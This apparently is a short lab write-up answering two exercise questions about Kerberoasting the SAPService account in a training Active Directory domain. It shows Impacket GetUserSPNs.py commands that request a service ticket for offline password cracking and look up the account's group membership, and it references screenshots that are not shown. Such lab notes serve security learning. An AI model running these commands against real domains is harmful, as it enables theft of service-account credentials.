## Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService
```
![](Screenshot%202026-05-27%20at%2018.33.43.png)
![](Screenshot%202026-05-27%20at%2018.37.13.png)

## What powerful local group on the Domain Controller is the SAPService user a member of?

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService | grep 'SAPService'
```
![](Pasted%20image%2020260527184213.png)
